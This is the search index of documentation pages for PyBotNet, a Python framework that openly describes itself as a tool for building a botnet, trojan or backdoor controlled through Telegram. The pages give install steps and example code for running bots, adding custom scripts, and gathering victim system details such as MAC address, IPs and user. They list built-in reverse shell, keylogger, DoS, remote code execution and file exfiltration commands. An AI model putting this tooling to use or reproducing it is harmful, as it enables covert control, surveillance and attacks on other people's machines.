{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"PyBotNet A Python framework for building remote control , botnet , trojan or backdoor with Telegram or other control panels Disclaimer: Please note that this is a research project. I am by no means responsible for any usage of this tool. Use it on your behalf!. Source Code : https://github.com/onionj/pybotnet Documentation : https://onionj.github.io/pybotnet/ Features: \u00b6 Built in Telegram control pannel and proxy Built in scripts like: reverse shell put or get file run python code on target systems get screenshot keylogger dos scheduler ... Cross platform Ability to easily add custom scripts Import external scripts Ability to add custom control panel Add remote control to your apps ... Go to the next page to create the first remote control :)","title":"About"},{"location":"#features","text":"Built in Telegram control pannel and proxy Built in scripts like: reverse shell put or get file run python code on target systems get screenshot keylogger dos scheduler ... Cross platform Ability to easily add custom scripts Import external scripts Ability to add custom control panel Add remote control to your apps ... Go to the next page to create the first remote control :)","title":"Features:"},{"location":"tutorial_advanced_guide/create_custom_engine/","text":"comming soon..","title":"Create custom engine"},{"location":"tutorial_advanced_guide/linux_crontab/","text":"comming soon..","title":"Linux crontab"},{"location":"tutorial_advanced_guide/linux_services/","text":"comming soon..","title":"Linux services"},{"location":"tutorial_advanced_guide/windows_startup/","text":"comming soon..","title":"Windows startup"},{"location":"tutorial_user_guide/add_custom_script/","text":"Add custom scripts \u00b6 in some case you need to add your own custom scripts The simplest PyBotNet custom script could look like this: main.py from pybotnet import BotNet , Context , TelegramEngine # (4) telegram_engine = TelegramEngine ( token = TELEGRAM_TOKEN , admin_chat_id = ADMIN_CHAT_ID ) #(1) botnet = BotNet ( telegram_engine ) # (2) # new: @botnet . add_script ( script_version = \"0.1.0\" ) # (3) def ping ( context : Context ): # (5) \"\"\"`/ping`\"\"\" response = f \"pong { ' ' . join ( context . command ) } \" # (6) return response # (7) botnet . run () # (8) create engine: Engines transfer messages between admin and botnet create BotNet instance create new custom script we import Context to recive requests and system data get context get admin command from context and join to \"pong\" , if admin send /ping foo bar so response is pong foo bar return response to admin run main loop In the code above, we added a script that returns pong <message> for us when we execute the \\ping <message> comment. As you see. We used a decorator to add our script to the botnet instance, now if we execute the code we have access to the ping script in the control panel. Scripts can also contain Context parameters, which include the engine itself, system data, commands sent by the user, and so on. Note Context is an optional parameter and if you do not include Context in your function, nothing will happen, but in this case you do not have access to the data inside it. If you return None , it will not send this to the admin (no response) add_script decorator \u00b6 the program reads the function name and saves it as script name, but you can change the name by set the script_name variable to the decorator. main.py from pybotnet import BotNet , Context , TelegramEngine telegram_engine = TelegramEngine ( token = TELEGRAM_TOKEN , admin_chat_id = ADMIN_CHAT_ID ) botnet = BotNet ( telegram_engine ) # new: @botnet . add_script ( script_version = \"0.1.0\" , script_name = \"1ping\" ) # (1) def ping ( context : Context ): \"\"\"`/1ping`\"\"\" return f \"pong { ' ' . join ( context . command ) } \" botnet . run () change script name from default ( ping ) to 1ping Context \u00b6 Context has a series of useful variables and methods: command: List For example in above code if the user send /1ping foo bar , context.command return this list: [\"foo\", \"bar\"] time_stamp: str context creation time system_info: callable this method return a Dict as target system info, if you call it like this: context.system_info() return this data: scripts_name mac_addres os global_ip bot_name local_ip host_name system_user up_time current_route pid cpu_count pybotnet_version and if you call this like this context.system_info(minimal=True) return just minimal data: scripts_name mac_addres os global_ip bot_name system_info method cache data for 30s engine: This variable returns the active engine, engins have send() , receive() and send_file() methods; You can use them to communicate with the admin. send method get two parameter, first a string (required), second is a Dict (optional) for add it to sub of message you can send context.system_info(minimal=True) to second parameter send_file like send method have two parametr, first parametr get route of file (required), second is a Dict (optional) for add it to sub of message.. recive return not procesed admin command as a list of string, and if not found new admin command, return False mata_data: Dict this variable contain courent script_name , script_version and script_doc set_global_value: callable With this method you can save data in memory, The data is cleared when the botnet is closed \u200d\u200d(This is just a Dict!) get_global_value: callable Takes a key and returns the data UserException \u00b6 for example if input data from admin (we get it from context.command or in script call context.engine.recive() ) not valid... we can raise as UserException like: raise UserException(\"the reason\") we can use simple_serializer to validate user input data, this function check len, type of data and if is ok return a list of converted command by new types.. main.py from pybotnet import BotNet , Context , TelegramEngine , simple_serializer # (1) telegram_engine = TelegramEngine ( token = TELEGRAM_TOKEN , admin_chat_id = ADMIN_CHAT_ID ) botnet = BotNet ( telegram_engine ) @botnet . add_script () def echo ( context : Context ): \"\"\"`/echo <number> <world>`\"\"\" command , err = simple_serializer ( context . command , [ int , str ]) # (2) if err : # (3) raise UserException ( err ) # (4) # (5) number = command [ 0 ] world = command [ 1 ] for _ in range ( number ): print ( world ) # (6) botnet . run () import simple_serializer from pybotnet we send user command and excepted types to simple_serializer if err not None send detail from bad value and script data to admin this data returned from simple_serializer, and have new data types.. as you see we don't return anything, (by default python return None ) so this script don't have response for admin","title":"Add custom script"},{"location":"tutorial_user_guide/add_custom_script/#add-custom-scripts","text":"in some case you need to add your own custom scripts The simplest PyBotNet custom script could look like this: main.py from pybotnet import BotNet , Context , TelegramEngine # (4) telegram_engine = TelegramEngine ( token = TELEGRAM_TOKEN , admin_chat_id = ADMIN_CHAT_ID ) #(1) botnet = BotNet ( telegram_engine ) # (2) # new: @botnet . add_script ( script_version = \"0.1.0\" ) # (3) def ping ( context : Context ): # (5) \"\"\"`/ping`\"\"\" response = f \"pong { ' ' . join ( context . command ) } \" # (6) return response # (7) botnet . run () # (8) create engine: Engines transfer messages between admin and botnet create BotNet instance create new custom script we import Context to recive requests and system data get context get admin command from context and join to \"pong\" , if admin send /ping foo bar so response is pong foo bar return response to admin run main loop In the code above, we added a script that returns pong <message> for us when we execute the \\ping <message> comment. As you see. We used a decorator to add our script to the botnet instance, now if we execute the code we have access to the ping script in the control panel. Scripts can also contain Context parameters, which include the engine itself, system data, commands sent by the user, and so on. Note Context is an optional parameter and if you do not include Context in your function, nothing will happen, but in this case you do not have access to the data inside it. If you return None , it will not send this to the admin (no response)","title":"Add custom scripts"},{"location":"tutorial_user_guide/add_custom_script/#add_script-decorator","text":"the program reads the function name and saves it as script name, but you can change the name by set the script_name variable to the decorator. main.py from pybotnet import BotNet , Context , TelegramEngine telegram_engine = TelegramEngine ( token = TELEGRAM_TOKEN , admin_chat_id = ADMIN_CHAT_ID ) botnet = BotNet ( telegram_engine ) # new: @botnet . add_script ( script_version = \"0.1.0\" , script_name = \"1ping\" ) # (1) def ping ( context : Context ): \"\"\"`/1ping`\"\"\" return f \"pong { ' ' . join ( context . command ) } \" botnet . run () change script name from default ( ping ) to 1ping","title":"add_script decorator"},{"location":"tutorial_user_guide/add_custom_script/#context","text":"Context has a series of useful variables and methods: command: List For example in above code if the user send /1ping foo bar , context.command return this list: [\"foo\", \"bar\"] time_stamp: str context creation time system_info: callable this method return a Dict as target system info, if you call it like this: context.system_info() return this data: scripts_name mac_addres os global_ip bot_name local_ip host_name system_user up_time current_route pid cpu_count pybotnet_version and if you call this like this context.system_info(minimal=True) return just minimal data: scripts_name mac_addres os global_ip bot_name system_info method cache data for 30s engine: This variable returns the active engine, engins have send() , receive() and send_file() methods; You can use them to communicate with the admin. send method get two parameter, first a string (required), second is a Dict (optional) for add it to sub of message you can send context.system_info(minimal=True) to second parameter send_file like send method have two parametr, first parametr get route of file (required), second is a Dict (optional) for add it to sub of message.. recive return not procesed admin command as a list of string, and if not found new admin command, return False mata_data: Dict this variable contain courent script_name , script_version and script_doc set_global_value: callable With this method you can save data in memory, The data is cleared when the botnet is closed \u200d\u200d(This is just a Dict!) get_global_value: callable Takes a key and returns the data","title":"Context"},{"location":"tutorial_user_guide/add_custom_script/#userexception","text":"for example if input data from admin (we get it from context.command or in script call context.engine.recive() ) not valid... we can raise as UserException like: raise UserException(\"the reason\") we can use simple_serializer to validate user input data, this function check len, type of data and if is ok return a list of converted command by new types.. main.py from pybotnet import BotNet , Context , TelegramEngine , simple_serializer # (1) telegram_engine = TelegramEngine ( token = TELEGRAM_TOKEN , admin_chat_id = ADMIN_CHAT_ID ) botnet = BotNet ( telegram_engine ) @botnet . add_script () def echo ( context : Context ): \"\"\"`/echo <number> <world>`\"\"\" command , err = simple_serializer ( context . command , [ int , str ]) # (2) if err : # (3) raise UserException ( err ) # (4) # (5) number = command [ 0 ] world = command [ 1 ] for _ in range ( number ): print ( world ) # (6) botnet . run () import simple_serializer from pybotnet we send user command and excepted types to simple_serializer if err not None send detail from bad value and script data to admin this data returned from simple_serializer, and have new data types.. as you see we don't return anything, (by default python return None ) so this script don't have response for admin","title":"UserException"},{"location":"tutorial_user_guide/config_BotNet_class/","text":"you can change some config from BotNet class example: main.py from pybotnet import BotNet , TelegramEngine telegram_engine = TelegramEngine ( token = TELEGRAM_TOKEN , admin_chat_id = ADMIN_CHAT_ID ) botnet = BotNet ( telegram_engine , # (1) bot_name = \"onion!\" , # (2) version = \"1.0.0\" , # (3) delay = 1.5 , # (4) use_default_scripts = True , # (5) start_end_notify = True , # (6) debug = False # (7) ) botnet . run () Positional parameter engine Custom name for this instance just a version! sleep in main_loop use build in scripts, default is True Send a message to the admin when the program is running or stopped, default is True show logs by log level debug !, default is False","title":"config BotNet class"},{"location":"tutorial_user_guide/external_scripts/","text":"You can write a series of scripts outside the main file and add it to your botnet by import_external_scripts lets see some example: external_scripts.py from pybotnet import ExternalScripts , Context # (1) external_botnet = ExternalScripts () # (2) @external_botnet . add_script () # (3) def hello_world (): \"\"\"return hello_world\"\"\" return \"hello_world\" @external_botnet . add_script ( script_name = 'sys_data' , script_version = \"0.1.0\" ) # (4) def get_system_info ( context : Context ): \"\"\"return system_info\"\"\" sys_data = \"\" for key , value in context . system_info () . items (): sys_data += f \" { key } : { value } \\n \" return sys_data import ExternalScripts from pybotnet create ExternalScripts instance add some simple script create other script.. in code above we create a instance of ExternalScripts (this a botNet child) and add our scripts.. main.py from pybotnet import BotNet , Context , TelegramEngine from external_scripts import external_botnet # (1) telegram_engine = TelegramEngine ( token = TELEGRAM_TOKEN , admin_chat_id = ADMIN_CHAT_ID ) botnet = BotNet ( telegram_engine ) botnet . import_external_scripts ( external_botnet ) # (2) botnet . run () # (3) import external_botnet from external_scripts.py add external scripts to our botnet instance or you can use botnet.run_background(), botnet.stop_background() import external_botnet from external_script and add external scripts to botnet by call botnet.import_external_scripts(external_botnet)","title":"External scripts"},{"location":"tutorial_user_guide/run_in_%20background/","text":"botnet in background example: main.py import time from pybotnet import BotNet , TelegramEngine telegram_engine = TelegramEngine ( token = TELEGRAM_TOKEN , admin_chat_id = ADMIN_CHAT_ID ) botnet = BotNet ( telegram_engine ) botnet . run_background () # (1) time . sleep ( 10 ) # (2) botnet . stop_background () # (3) run botnet in background just wait for 10s stop botnet in above example we run botnet in backgrund, wait for 10s and stop it!","title":"Run in  background"},{"location":"tutorial_user_guide/run_module/","text":"We have seen before that we need some code to run pybotnet, but it is possible to run pybotnet as a module All you have to do is, install PyBotNet on your system and enter the following command in your terminal: python3 -m pybotnet -t [TELEGRAM_TOKEN] -i [ADMIN_CHAT_ID] -n [BOT NAME] somthing like: python3 -m pybotnet -t 5526760482:AAGweoNtLrHEsasxnklwhjms78ytPS3U8gEO6asc -i 5590231667 -n test","title":"Run module"},{"location":"tutorial_user_guide/simple_usage/","text":"Install PyBotNet \u00b6 pip3 install pybotnet -U --pre Note Currently version 2 of the PyBotNet is pre-release --pre : Include pre-release and development versions. By default, pip only finds stable versions. -U : make sure to upgrade framework to latest version. The simplest PyBotNet file could look like this: \u00b6 main.py from pybotnet import BotNet , TelegramEngine telegram_engine = TelegramEngine ( token = TELEGRAM_TOKEN , admin_chat_id = ADMIN_CHAT_ID ) #(1) botnet = BotNet ( telegram_engine ) # (2) botnet . run () create engine: Engines transfer messages between admin and botnet create BotNet instance Note TELEGRAM_TOKEN : Get it from the telegram @botfather ADMIN_CHAT_ID : Get it from @userinfobot telegram bot this code include default scripts, like: shell , put_file , get_file , screenshot , who , ... Run code: \u00b6 python3 main.py telegram engine \u00b6 open telegram and send /who to your bot; If you have done the steps correctly, you recive message like this: scripts_name: echo who shell screenshot put_file get_file runcode openurl dos schedule mac_addres: 228362405364 os: Linux global_ip: 5.10.30.35 country: Iran, Islamic Republic of bot_name: no_name local_ip: {'192.168.23.1'} host_name: {'system_name'} system_user: root up_time: 0:00:01 current_route: / pid: 148352 cpu_count: 8 pybotnet_version: 2.0.8b0 from cache: True you can send /help to see help page, or send /help <script_name> to recive more help about specific script. for example send /help screenshot , You will receive: NAME: screenshot DESCRIPTION: get screen shot * `[mac-address] /screenshot` or * `/screenshot` example command: * `94945035671481 /screenshot` * `/screenshot` return: img or img-download-link script_version: 0.0.1 default_script: True ___________________________ scripts_name: ['echo', 'who', 'shell', 'screenshot', 'put_file', 'get_file', 'runcode', 'openurl', 'dos', 'schedule'] mac_addres: 228362405364 os: Linux global_ip: 5.10.30.35 country: Iran, Islamic Republic of bot_name: no_name use_proxy: False in top of message you see script name, description, syntax and examples. for run screenshot script you have two choice: Run the script on all clients that are listening to Telegram bot (for now we have one!) Run script on one specific system for run script on all client send /screenshot . bot if you need get screen shot on specific system you need send [mac_addres] /screenshot for our case: 228362405364 /screenshot in some case like /shell you need to run it just for one system.","title":"Simple usage"},{"location":"tutorial_user_guide/simple_usage/#install-pybotnet","text":"pip3 install pybotnet -U --pre Note Currently version 2 of the PyBotNet is pre-release --pre : Include pre-release and development versions. By default, pip only finds stable versions. -U : make sure to upgrade framework to latest version.","title":"Install PyBotNet"},{"location":"tutorial_user_guide/simple_usage/#the-simplest-pybotnet-file-could-look-like-this","text":"main.py from pybotnet import BotNet , TelegramEngine telegram_engine = TelegramEngine ( token = TELEGRAM_TOKEN , admin_chat_id = ADMIN_CHAT_ID ) #(1) botnet = BotNet ( telegram_engine ) # (2) botnet . run () create engine: Engines transfer messages between admin and botnet create BotNet instance Note TELEGRAM_TOKEN : Get it from the telegram @botfather ADMIN_CHAT_ID : Get it from @userinfobot telegram bot this code include default scripts, like: shell , put_file , get_file , screenshot , who , ...","title":"The simplest PyBotNet file could look like this:"},{"location":"tutorial_user_guide/simple_usage/#run-code","text":"python3 main.py","title":"Run code:"},{"location":"tutorial_user_guide/simple_usage/#telegram-engine","text":"open telegram and send /who to your bot; If you have done the steps correctly, you recive message like this: scripts_name: echo who shell screenshot put_file get_file runcode openurl dos schedule mac_addres: 228362405364 os: Linux global_ip: 5.10.30.35 country: Iran, Islamic Republic of bot_name: no_name local_ip: {'192.168.23.1'} host_name: {'system_name'} system_user: root up_time: 0:00:01 current_route: / pid: 148352 cpu_count: 8 pybotnet_version: 2.0.8b0 from cache: True you can send /help to see help page, or send /help <script_name> to recive more help about specific script. for example send /help screenshot , You will receive: NAME: screenshot DESCRIPTION: get screen shot * `[mac-address] /screenshot` or * `/screenshot` example command: * `94945035671481 /screenshot` * `/screenshot` return: img or img-download-link script_version: 0.0.1 default_script: True ___________________________ scripts_name: ['echo', 'who', 'shell', 'screenshot', 'put_file', 'get_file', 'runcode', 'openurl', 'dos', 'schedule'] mac_addres: 228362405364 os: Linux global_ip: 5.10.30.35 country: Iran, Islamic Republic of bot_name: no_name use_proxy: False in top of message you see script name, description, syntax and examples. for run screenshot script you have two choice: Run the script on all clients that are listening to Telegram bot (for now we have one!) Run script on one specific system for run script on all client send /screenshot . bot if you need get screen shot on specific system you need send [mac_addres] /screenshot for our case: 228362405364 /screenshot in some case like /shell you need to run it just for one system.","title":"telegram engine"}]}